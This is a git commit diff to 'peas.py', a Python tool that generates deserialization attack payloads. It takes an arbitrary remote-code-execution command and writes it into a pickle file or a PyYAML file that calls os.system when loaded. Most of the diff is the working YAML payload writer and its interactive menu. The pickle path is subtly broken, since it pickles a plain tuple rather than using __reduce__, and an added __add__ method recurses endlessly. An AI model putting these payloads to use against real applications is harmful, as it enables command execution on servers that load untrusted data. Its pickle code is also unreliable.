d7280dec96e60e9230c2d058bf52be5ebe34e978
j0lt <34833539+j0lt-github@users.noreply.github.com>
2019-01-18 08:02:26 +0530

    Update peas.py
    yaml payload added

--- peas.py
+++ peas.py
@@ -1,4 +1,4 @@
-# Python Deserialization attack payload file generator for pickle module by j0lt
+# Python Deserialization attack payload file generator for pickle and yaml module by j0lt
 # Requirements : Python 3
 # Usage : python peas.py
 
@@ -8,15 +8,41 @@ import os
 
 class Payload(object):
 
-    def __init__(self):
-        self.cmd = input("Enter RCE command :")
+    def __init__(self, cmd ,  location):
+        self.cmd = cmd
+        self.location = location
 
-    def __reduce__(self):
+    def pick(self):
+        pickle.dump((os.system, (self.cmd,)), open(self.location .__add__("_pick"), "wb"))
 
-        return os.system, (self.cmd,)
+    def ya(self):
+        open(self.location.__add__("_yaml"), "wb").write(bytes("!!python/object/apply:os.system ['{}']".format(self.cmd), "utf-8"))
+
+    def __add__(self, other):
+
+        return self+other
 
 
 if __name__ == "__main__":
+    cmd = input("Enter RCE command :")
+    location = input("Enter File location and name to save :")
+    p = Payload(cmd, location)
+    while 1:
+        module = input("Select Module (Pickle, PyYAML, All) :").lower()
 
-    a = pickle.dump(Payload(), open(input("Enter File location and name to save :"), "wb"))
-    print("done...")
+
+        if module == "pickle":
+            p.pick()
+            break
+        elif module == "pyyaml":
+            p.ya()
+            break
+        elif module == "all":
+            p.pick()
+            p.ya()
+            break
+        else:
+            print("Wrong Input ")
+            continue
+
+    print("done")
